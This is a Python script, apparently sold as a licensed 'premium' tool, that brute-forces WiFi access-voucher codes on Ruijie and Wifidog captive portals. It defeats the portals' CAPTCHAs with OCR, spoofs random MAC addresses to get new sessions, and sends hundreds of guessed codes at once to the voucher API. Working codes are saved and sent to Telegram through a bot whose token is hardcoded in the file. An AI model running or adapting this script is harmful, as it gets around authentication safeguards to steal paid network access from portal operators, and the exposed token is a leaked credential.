import asyncio, aiohttp, json, random, re, os, string, time, cv2, ddddocr, numpy as np
from datetime import datetime, timezone
import telebot
from telebot.async_telebot import AsyncTeleBot

try: import uvloop; asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except: pass

# ==========================================
# 🎨 PREMIUM CYBERPUNK COLORS (အရောင်များ)
# ==========================================
G = "\033[1;32m"  # Success Green
Y = "\033[1;33m"  # Warning Yellow
C = "\033[1;36m"  # Info Cyan
R = "\033[1;31m"  # Danger Red
M = "\033[1;35m"  # Magenta
W = "\033[1;37m"  # White
B = "\033[1;34m"  # Blue
X = "\033[0m"     # Reset
BOLD = "\033[1m"

BOT_TOKEN = '8878643302:AAHTVx84Y6UT3IBqSQsZNXfH8OWyY6vHEAE'
REPO_OWNER = "abkay400-sys"
REPO_NAME = "mgmgsan-"

bot = AsyncTeleBot(BOT_TOKEN)
_ocr = ddddocr.DdddOcr(show_ad=False)
checked_count = 0
hits_count = 0
active_codes = []  # မိထားသော ကုဒ်စာရင်းသိမ်းရန်
start_time = 0     # Speed တွက်ရန်
current_running_code = "000000"
CONCURRENCY, BATCH_SIZE = 500, 500

# ==========================================
# 💾 RESULT SAVE SYSTEM (ဖိုင်သိမ်းစနစ်)
# ==========================================
def save_result_to_file(working_code):
    global hits_count
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # ရလဒ်များကို MGSAN_Results.txt ထဲသို့ သိမ်းခြင်း
    with open("MGSAN_Results.txt", "a", encoding="utf-8") as file:
        file.write(f"[{current_time}] ✨ Active Code: {working_code} | Data: 1000M | Time: 3 hr 0 min\n")
    
    # Dashboard မှာ ပြသရန် စာရင်းထဲထည့်ခြင်း
    active_codes.append({"code": working_code, "package": "1000M", "time": "3 hr 0 min"})
    hits_count += 1

# ==========================================
# 🖥️ PREMIUM DASHBOARD UI (စကင်ဖတ်နေစဉ်ပြမည့်မျက်နှာပြင်)
# ==========================================
def draw_premium_dashboard():
    os.system('clear')
    elapsed = time.time() - start_time
    speed = round(checked_count / elapsed, 1) if elapsed > 0 else 0
    speed_str = f"{speed} c/s"

    # Header Banner
    print(f"{C}┌────────────────────────────────────────────────────────┐{X}")
    print(f"{C}│{G}{BOLD}   ⚡ MGSAN NET-HUNTER PREMIUM v2.0 ⚡                 {C}│{X}")
    print(f"{C}│{W}   Status: {G}Scanning...{W}      |  Telegram: {M}@MGSAN_OFFICIAL   {C}│{X}")
    print(f"{C}└────────────────────────────────────────────────────────┘{X}")
    
    # Status Cards Box
    print(f"{C}┌──────────────────────────────┬─────────────────────────┐{X}")
    print(f"{C}│ {W}SPEED       : {G}{speed_str:<12} {C}│ {W}HITS        : {G}{hits_count:<8} {C}│{X}")
    print(f"{C}│ {W}TOTAL TRIED : {Y}{checked_count:<12,} {C}│ {W}EXPIRED     : {R}{'0':<8} {C}│{X}")
    print(f"{C}│ {W}CURRENT CODE: {R}{current_running_code:<12} {C}│ {W}LIMITS      : {B}{'0':<8} {C}│{X}")
    print(f"{C}└──────────────────────────────┴─────────────────────────┘{X}")
    
    # Active Codes Panel
    print(f"\n{Y}🔑 [ VALID ACTIVE CODES NOW ]{X}")
    print(f"{C}──────────────────────────────────────────────────────────{X}")
    if active_codes:
        for idx, item in enumerate(active_codes, 1):
            print(f" {G}{idx:02d} ➔ {BOLD}[ HIT ]{X} Code: {G}{item['code']}{X} │ 🧃 Data: {Y}{item['package']}{X} │ ⏰ Time: {C}{item['time']}{X}")
    else:
        print(f" {R} No active codes found yet. Scanning in progress...{X}")
    print(f"{C}──────────────────────────────────────────────────────────{X}")
    print(f"\n{W} 💡 {Y}Tip: {W}Press {R}[CTRL + C]{W} to stop and exit.{X}\n")

async def check_user_key(chat_id):
    url = f"https://raw.githubusercontent.com/{REPO_OWNER}/{REPO_NAME}/main/auth_list.json"
    async with aiohttp.ClientSession() as s:
        async with s.get(url) as r:
            if r.status == 200:
                auth_list = json.loads(await r.text())
                if chat_id in auth_list:
                    expiry = auth_list[chat_id].get("expires_at")
                    if expiry == "9999-12-31T23:59:59Z": return True
                    return datetime.now(timezone.utc) < datetime.fromisoformat(expiry.replace("Z", "+00:00"))
    return False

async def get_session_id(session, url):
    mac = ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))
    url = re.sub(r'(?<=mac=)[^&]+', mac, url)
    try:
        async with session.get(url, allow_redirects=True) as req:
            s_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return s_id.group(1) if s_id else None
    except: return None

async def perform_check(session_url, code, chat_id):
    global checked_count, current_running_code
    current_running_code = code
    await asyncio.sleep(random.uniform(0.2, 0.7))
    async with aiohttp.ClientSession() as ts:
        session_id = await get_session_id(ts, session_url)
        if not session_id: return
        auth_code = None
        for _ in range(5):
            try:
                params = {'sessionId': session_id, '_t': str(time.time())}
                async with ts.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params) as r: img = await r.read()
                txt = await asyncio.to_thread(lambda: _ocr.classification(img).upper())
                if txt:
                    async with ts.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json={'sessionId': session_id, 'authCode': txt}) as vr:
                        if (await vr.json()).get("success") == True: auth_code = txt; break
            except: pass
        if not auth_code: return
        try:
            async with ts.post('https://portal-as.ruijienetworks.com/api/auth/voucher/', json={"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}) as req:
                if req.status == 429: await asyncio.sleep(5); return
                resp = await req.text()
                checked_count += 1
                
                # UI ကို အချိန်နှင့်တပြေးညီ ဆွဲပေးခြင်း
                if checked_count % 10 == 0:
                    draw_premium_dashboard()
                    
                if 'success' in resp.lower() or '"code":0' in resp:
                    save_result_to_file(code) # ဖိုင်ထဲသိမ်းစနစ်ခေါ်ခြင်း
                    draw_premium_dashboard()   # Dashboard ပြန်ဆွဲခြင်း
                    await bot.send_message(chat_id, f"🎉 **Voucher Code Found!**\n🎫 Code: `{code}`", parse_mode="Markdown")
        except: pass

def iter_codes(mode):
    if mode in ["6", "7"]:
        c = [str(i).zfill(int(mode)) for i in range(10**int(mode))]; random.shuffle(c); yield from c
    elif mode == "8":
        c = [str(i).zfill(8) for i in range(10**8)]; random.shuffle(c); yield from c
    else: # Mode 'all' သို့မဟုတ် 'wifidog' နမူနာအတွက် 6 လုံးထွက်စေရန်
        while True: yield "".join(random.choices(string.ascii_lowercase + string.digits, k=6))

# ==========================================
# 🎨 MAIN MENU UI (ပင်မရွေးချယ်မှုမျက်နှာပြင်)
# ==========================================
def show_menu():
    os.system('clear')
    print(f"{C}=================================================={X}")
    print(f"{G}{BOLD}    ███╗   ███╗ ██████╗ ███████╗ █████╗ ███╗   ██╗  {X}")
    print(f"{G}{BOLD}    ████╗ ████║██╔════╝ ██╔════╝██╔══██╗████╗  ██║  {X}")
    print(f"{G}{BOLD}    ██╔████╔██║██║  ███╗███████╗███████║██╔██╗ ██║  {X}")
    print(f"{G}{BOLD}    ██║╚██╔╝██║██║   ██║╚════██║██╔══██║██║╚██╗██║  {X}")
    print(f"{G}{BOLD}    ██║ ╚═╝ ██║╚██████╔╝███████║██║  ██║██║ ╚████║  {X}")
    print(f"{G}{BOLD}    ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝  {X}")
    print(f"{C}      >> MGSAN PREMIUM NETWORK SCANNER v2.0 <<     {X}")
    print(f"{C}=================================================={X}")
    
    print(f"\n{Y}[+] PLEASE SELECT SCANNING MODE :{X}\n")
    print(f"  {G}[1]{X} {BOLD}Mode 6{X}  ->  Ruijie Standard Scan")
    print(f"  {G}[2]{X} {BOLD}Mode 7{X}  ->  Ruijie Advanced Scan")
    print(f"  {G}[3]{X} {BOLD}Mode 8{X}  ->  Ruijie Deep Scan")
    print(f"  {G}[4]{X} {BOLD}Wifidog{X} ->  Wifidog Captive Portal Scan {R}(New){X}")
    print(f"  {G}[5]{X} {BOLD}Scan All{X}->  Run All Scanning Methods")
    print(f"  {R}[0]{X} {BOLD}Exit{X}    ->  Close Scanner")
    print(f"\n{C}--------------------------------------------------{X}")

async def main_terminal():
    global start_time
    show_menu()
    choice = input(f"{Y}👉 Enter Number (0-5): {X}").strip()
    
    if choice == "0":
        print(f"\n{R}👋 Exiting Scanner... Goodbye!{X}\n")
        return
        
    mode_map = {"1": "6", "2": "7", "3": "8", "4": "wifidog", "5": "all"}
    mode = mode_map.get(choice)
    
    if not mode:
        print(f"\n{R}❌ Invalid Choice! Exiting...{X}\n")
        return
        
    print(f"\n{C}──────────────────────────────────────────────────{X}")
    chat_id_input = input(f"{G}👤 သင့်၏ Telegram ID ကို ရိုက်ထည့်ပါ: {X}").strip()
    
    print(f"\n{Y}⏳ Key သက်တမ်း စစ်ဆေးနေပါသည်...{X}")
    if not await check_user_key(chat_id_input):
        print(f"{R}❌ သင့် Key သည် သက်တမ်းကုန်ဆုံးနေပါပြီ သို့မဟုတ် Key မရှိပါ။{X}"); return
    
    print(f"{G}✅ Key အောင်မြင်ပါသည်။{X}")
    session_url = input(f"\n{G}🔗 သင့်၏ Ruijie/Wifidog Session URL ကို Paste ချပေးပါ: {X}").strip()
    if not session_url: print(f"{R}❌ URL မမှန်ကန်ပါ။{X}"); return
    
    print(f"\n{G}🚀 Premium Dashboard စတင်နေပါပြီ...{X}\n")
    time.sleep(1)
    
    start_time = time.time()
    code_iter = iter_codes(mode)
    
    while True:
        batch = [next(code_iter) for _ in range(BATCH_SIZE)]
        await asyncio.gather(*[perform_check(session_url, c, int(chat_id_input)) for c in batch])
        draw_premium_dashboard() # Batch တစ်ခုပြီးတိုင်း UI Update လုပ်ရန်
        await asyncio.sleep(0.1)

if __name__ == '__main__':
    try:
        asyncio.run(main_terminal())
    except KeyboardInterrupt:
        print(f"\n\n{R}🛑 Scanner ဖွင့်ထားခြင်းကို ရပ်တန့်လိုက်ပါပြီ။{X}\n")
    
